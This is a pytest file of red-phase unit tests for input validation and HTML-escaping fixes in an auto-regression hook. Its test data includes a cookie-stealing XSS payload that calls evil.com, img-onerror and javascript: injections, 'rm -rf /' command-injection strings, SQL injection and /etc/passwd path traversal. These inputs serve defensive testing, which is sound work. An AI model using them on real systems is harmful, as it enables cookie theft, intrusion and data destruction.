"""
Unit tests for security fixes in auto_add_to_regression.py hook.

Tests the MEDIUM severity XSS vulnerability fix:
- validate_python_identifier() function
- sanitize_user_description() function
- Template-based generation (XSS prevention)

TDD Phase: RED (these tests should FAIL - no implementation yet)
Expected: All tests fail until implementer adds security functions

Security Context:
- MEDIUM severity XSS vulnerability in auto_add_to_regression.py
- User input directly embedded in generated Python test files
- Attack vector: malicious user_prompt or file_path values
- Fix: Input validation + HTML entity encoding + Template usage
"""

import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# Add hooks directory to path for imports
sys.path.insert(
    0,
    str(
        Path(__file__).parent.parent.parent.parent
        / "plugins"
        / "autonomous-dev"
        / "hooks"
    ),
)

from auto_add_to_regression import (
    validate_python_identifier,  # NEW - does not exist yet
    sanitize_user_description,  # NEW - does not exist yet
    generate_feature_regression_test,
    generate_bugfix_regression_test,
    generate_performance_baseline_test,
)


# ============================================================================
# Test validate_python_identifier() - 10 tests
# ============================================================================


class TestValidatePythonIdentifier:
    """Test Python identifier validation (prevents code injection)."""

    def test_rejects_empty_string(self):
        """Test validation rejects empty string."""
        with pytest.raises(ValueError, match="Identifier cannot be empty"):
            validate_python_identifier("")

    def test_rejects_python_keyword(self):
        """Test validation rejects Python reserved keywords."""
        with pytest.raises(ValueError, match="Python keyword"):
            validate_python_identifier("import")

        with pytest.raises(ValueError, match="Python keyword"):
            validate_python_identifier("class")

        with pytest.raises(ValueError, match="Python keyword"):
            validate_python_identifier("def")

    def test_rejects_special_characters(self):
        """Test validation rejects special characters (XSS attack vectors)."""
        with pytest.raises(ValueError, match="Invalid identifier"):
            validate_python_identifier("module<script>")

        with pytest.raises(ValueError, match="Invalid identifier"):
            validate_python_identifier("module'; DROP TABLE")

        with pytest.raises(ValueError, match="Invalid identifier"):
            validate_python_identifier("module&exec")

    def test_rejects_starting_with_digit(self):
        """Test validation rejects identifiers starting with digit."""
        with pytest.raises(ValueError, match="Invalid identifier"):
            validate_python_identifier("123module")

    def test_rejects_dunder_methods(self):
        """Test validation rejects dunder methods (security risk)."""
        with pytest.raises(ValueError, match="Invalid identifier"):
            validate_python_identifier("__import__")

        with pytest.raises(ValueError, match="Invalid identifier"):
            validate_python_identifier("__builtins__")

    def test_rejects_excessively_long_identifier(self):
        """Test validation rejects identifiers over 100 characters."""
        long_identifier = "a" * 101
        with pytest.raises(ValueError, match="Identifier too long"):
            validate_python_identifier(long_identifier)

    def test_accepts_valid_identifier(self):
        """Test validation accepts valid Python identifier."""
        assert validate_python_identifier("module_name") == "module_name"
        assert validate_python_identifier("MyClass") == "MyClass"
        assert validate_python_identifier("function_123") == "function_123"

    def test_accepts_identifier_at_max_length(self):
        """Test validation accepts identifier exactly at 100 characters."""
        max_identifier = "a" * 100
        assert validate_python_identifier(max_identifier) == max_identifier

    def test_rejects_path_traversal_attempt(self):
        """Test validation rejects path traversal characters."""
        with pytest.raises(ValueError, match="Invalid identifier"):
            validate_python_identifier("../../../etc/passwd")

        with pytest.raises(ValueError, match="Invalid identifier"):
            validate_python_identifier("module/../../attack")

    def test_rejects_null_byte_injection(self):
        """Test validation rejects null byte injection attempts."""
        with pytest.raises(ValueError, match="Invalid identifier"):
            validate_python_identifier("module\x00attack")


# ============================================================================
# Test sanitize_user_description() - 15 tests
# ============================================================================


class TestSanitizeUserDescription:
    """Test user description sanitization (prevents XSS)."""

    def test_escapes_html_entities(self):
        """Test sanitization escapes HTML special characters."""
        result = sanitize_user_description("Feature: <script>alert('XSS')</script>")
        assert "<script>" not in result
        assert "&lt;script&gt;" in result
        assert "alert" in result  # Content preserved, tags escaped

    def test_escapes_ampersand(self):
        """Test sanitization escapes ampersand character."""
        result = sanitize_user_description("Feature: A & B")
        assert "&amp;" in result
        assert result == "Feature: A &amp; B"

    def test_escapes_less_than(self):
        """Test sanitization escapes less-than character."""
        result = sanitize_user_description("Feature: x < 10")
        assert "&lt;" in result
        assert result == "Feature: x &lt; 10"

    def test_escapes_greater_than(self):
        """Test sanitization escapes greater-than character."""
        result = sanitize_user_description("Feature: x > 5")
        assert "&gt;" in result
        assert result == "Feature: x &gt; 5"

    def test_escapes_quotes(self):
        """Test sanitization escapes quote characters."""
        result = sanitize_user_description('Feature: "quoted" text')
        assert "&quot;" in result

        result = sanitize_user_description("Feature: 'quoted' text")
        assert "&#x27;" in result

    def test_prevents_xss_payload_script_tag(self):
        """Test sanitization prevents XSS via script tag injection."""
        xss_payload = "<script>fetch('http://evil.com?cookie='+document.cookie)</script>"
        result = sanitize_user_description(xss_payload)

        # Verify no executable script remains
        assert "<script>" not in result
        assert "</script>" not in result
        assert "fetch(" in result  # Content preserved
        assert "&lt;script&gt;" in result  # Tags escaped

    def test_prevents_xss_payload_img_onerror(self):
        """Test sanitization prevents XSS via img onerror injection."""
        xss_payload = '<img src=x onerror="alert(1)">'
        result = sanitize_user_description(xss_payload)

        # Verify no executable code remains
        assert '<img src=x onerror="alert(1)">' not in result
        assert "&lt;img" in result
        assert "&gt;" in result

    def test_prevents_xss_payload_event_handler(self):
        """Test sanitization prevents XSS via event handler injection."""
        xss_payload = '<a href="#" onclick="malicious()">Click</a>'
        result = sanitize_user_description(xss_payload)

        # Verify no executable code remains
        assert "onclick=" not in result or "&quot;" in result
        assert "&lt;a" in result

    def test_removes_control_characters(self):
        """Test sanitization removes control characters."""
        result = sanitize_user_description("Feature:\x00\x01\x02test")
        assert "\x00" not in result
        assert "\x01" not in result
        assert "\x02" not in result
        assert "test" in result

    def test_handles_unicode_safely(self):
        """Test sanitization preserves safe unicode characters."""
        result = sanitize_user_description("Feature: 你好 世界 🚀")
        assert "你好" in result
        assert "世界" in result
        assert "🚀" in result

    def test_truncates_to_max_length(self):
        """Test sanitization truncates to 500 characters."""
        long_description = "A" * 600
        result = sanitize_user_description(long_description)

        assert len(result) <= 500
        assert result.endswith("...")  # Truncation indicator

    def test_preserves_content_under_max_length(self):
        """Test sanitization preserves content under 500 characters."""
        description = "Feature: Add user authentication with OAuth2"
        result = sanitize_user_description(description)

        assert result == description  # No escaping needed for safe content
        assert len(result) < 500

    def test_prevents_sql_injection_pattern(self):
        """Test sanitization escapes SQL injection patterns."""
        sql_injection = "Feature: '; DROP TABLE users; --"
        result = sanitize_user_description(sql_injection)

        # Single quotes should be escaped
        assert "&#x27;" in result or "'" not in result

    def test_prevents_command_injection_pattern(self):
        """Test sanitization escapes command injection patterns."""
        cmd_injection = "Feature: `rm -rf /` && echo 'pwned'"
        result = sanitize_user_description(cmd_injection)

        # Backticks and special chars should be safe
        assert "`" not in result or "&#x" in result

    def test_handles_empty_description(self):
        """Test sanitization handles empty description gracefully."""
        result = sanitize_user_description("")
        assert result == ""


# ============================================================================
# Integration Tests - XSS Prevention in Generation Functions - 10 tests
# ============================================================================


class TestXSSPreventionInGenerationFunctions:
    """Test XSS prevention in all three generation functions."""

    def test_generate_feature_prevents_xss_in_description(self, tmp_path):
        """Test generate_feature_regression_test escapes XSS in description."""
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        xss_payload = "<script>alert('XSS')</script> Feature description"

        test_file, test_content = generate_feature_regression_test(
            file_path, xss_payload
        )

        # Verify XSS is escaped
        assert "<script>" not in test_content
        assert "&lt;script&gt;" in test_content
        assert "alert" in test_content  # Content preserved

        # Verify no executable code in generated test
        assert "eval(" not in test_content
        assert "exec(" not in test_content

    def test_generate_feature_prevents_xss_in_module_name(self, tmp_path):
        """Test generate_feature_regression_test validates module name."""
        # Create file with malicious name (should fail validation)
        file_path = tmp_path / "<script>evil</script>.py"

        with pytest.raises(ValueError, match="Invalid identifier"):
            generate_feature_regression_test(file_path, "Safe description")

    def test_generate_bugfix_prevents_xss_in_description(self, tmp_path):
        """Test generate_bugfix_regression_test escapes XSS in description."""
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        xss_payload = '<img src=x onerror="malicious()"> Bug fix'

        test_file, test_content = generate_bugfix_regression_test(
            file_path, xss_payload
        )

        # Verify XSS is escaped
        assert '<img src=x onerror="malicious()">' not in test_content
        assert "&lt;img" in test_content
        assert "malicious" in test_content  # Content preserved

    def test_generate_bugfix_prevents_code_injection(self, tmp_path):
        """Test generate_bugfix_regression_test prevents code injection."""
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        code_injection = "Bug: '; import os; os.system('rm -rf /')"

        test_file, test_content = generate_bugfix_regression_test(
            file_path, code_injection
        )

        # Verify no executable code remains unescaped
        if "import os" in test_content:
            # If present, should be in escaped form or safe context
            assert "&#x27;" in test_content or "os.system" not in test_content

    def test_generate_performance_prevents_xss_in_description(self, tmp_path):
        """Test generate_performance_baseline_test escapes XSS."""
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        xss_payload = '<a href="javascript:alert(1)">Click</a> Optimization'

        test_file, test_content = generate_performance_baseline_test(
            file_path, xss_payload
        )

        # Verify XSS is escaped
        assert 'href="javascript:alert(1)"' not in test_content
        assert "&lt;a" in test_content or "javascript:" not in test_content

    def test_all_generators_use_template_not_fstring(self, tmp_path):
        """Test all generation functions use Template (not f-strings)."""
        file_path = tmp_path / "safe_module.py"
        file_path.touch()

        description = "Safe description with $variable"

        # Test feature generation
        _, feature_content = generate_feature_regression_test(file_path, description)
        # If using Template, $variable won't be interpolated
        assert "$variable" in feature_content or "variable" not in feature_content

        # Test bugfix generation
        _, bugfix_content = generate_bugfix_regression_test(file_path, description)
        assert "$variable" in bugfix_content or "variable" not in bugfix_content

        # Test performance generation
        _, perf_content = generate_performance_baseline_test(file_path, description)
        assert "$variable" in perf_content or "variable" not in perf_content

    def test_generated_code_is_valid_python(self, tmp_path):
        """Test all generation functions produce valid Python syntax."""
        import ast

        file_path = tmp_path / "test_module.py"
        file_path.touch()

        description = "Feature: Add <user> & <admin> roles"

        # Test feature generation produces valid Python
        _, feature_content = generate_feature_regression_test(file_path, description)
        try:
            ast.parse(feature_content)
        except SyntaxError as e:
            pytest.fail(f"Generated feature test has invalid Python syntax: {e}")

        # Test bugfix generation produces valid Python
        _, bugfix_content = generate_bugfix_regression_test(file_path, description)
        try:
            ast.parse(bugfix_content)
        except SyntaxError as e:
            pytest.fail(f"Generated bugfix test has invalid Python syntax: {e}")

        # Test performance generation produces valid Python
        _, perf_content = generate_performance_baseline_test(file_path, description)
        try:
            ast.parse(perf_content)
        except SyntaxError as e:
            pytest.fail(f"Generated performance test has invalid Python syntax: {e}")

    def test_prevents_path_traversal_in_module_name(self, tmp_path):
        """Test generation functions reject path traversal attempts."""
        # Create file with path traversal attempt
        file_path = tmp_path / "../../../etc/passwd.py"

        with pytest.raises(ValueError, match="Invalid identifier"):
            generate_feature_regression_test(file_path, "Safe description")

        with pytest.raises(ValueError, match="Invalid identifier"):
            generate_bugfix_regression_test(file_path, "Safe description")

        with pytest.raises(ValueError, match="Invalid identifier"):
            generate_performance_baseline_test(file_path, "Safe description")

    def test_prevents_null_byte_injection_in_description(self, tmp_path):
        """Test generation functions remove null bytes from description."""
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        null_byte_payload = "Feature\x00: Inject null byte"

        _, feature_content = generate_feature_regression_test(
            file_path, null_byte_payload
        )

        # Verify null byte is removed
        assert "\x00" not in feature_content
        assert "Inject null byte" in feature_content

    def test_prevents_triple_quote_escape(self, tmp_path):
        """Test generation functions escape triple quote attempts."""
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        triple_quote_escape = '""" + malicious_code + """'

        _, feature_content = generate_feature_regression_test(
            file_path, triple_quote_escape
        )

        # Verify triple quotes are escaped or safe
        # Malicious code should not execute
        assert 'malicious_code' not in feature_content or "&quot;" in feature_content


# ============================================================================
# Edge Case Tests - 5 tests
# ============================================================================


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_handles_unicode_in_description(self, tmp_path):
        """Test generation handles unicode characters safely."""
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        unicode_description = "Feature: 支持中文 и русский язык 🚀"

        _, content = generate_feature_regression_test(file_path, unicode_description)

        # Verify unicode is preserved
        assert "支持中文" in content
        assert "русский" in content
        assert "🚀" in content

    def test_handles_very_long_description(self, tmp_path):
        """Test generation truncates very long descriptions."""
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        long_description = "A" * 1000  # Much longer than 500 char limit

        _, content = generate_feature_regression_test(file_path, long_description)

        # Verify truncation occurred
        assert len(content) < len(long_description) * 2  # Much shorter
        assert "..." in content  # Truncation indicator

    def test_handles_empty_description(self, tmp_path):
        """Test generation handles empty description gracefully."""
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        _, content = generate_feature_regression_test(file_path, "")

        # Verify generated content is still valid Python
        import ast

        try:
            ast.parse(content)
        except SyntaxError as e:
            pytest.fail(f"Generated test with empty description has invalid syntax: {e}")

    def test_handles_only_special_characters(self, tmp_path):
        """Test generation handles description with only special characters."""
        file_path = tmp_path / "test_module.py"
        file_path.touch()

        special_chars = "<>\"'&!@#$%^&*()"

        _, content = generate_feature_regression_test(file_path, special_chars)

        # Verify all special chars are escaped
        assert "<>" not in content or "&lt;&gt;" in content
        assert '"' not in content or "&quot;" in content
        assert "'" not in content or "&#x27;" in content
        assert "&" not in content or "&amp;" in content

    def test_validates_module_name_case_sensitivity(self, tmp_path):
        """Test module name validation is case sensitive."""
        file_path = tmp_path / "MyModule.py"
        file_path.touch()

        # CamelCase should be accepted as valid identifier
        _, content = generate_feature_regression_test(file_path, "Safe description")

        # Verify module name is preserved
        assert "MyModule" in content
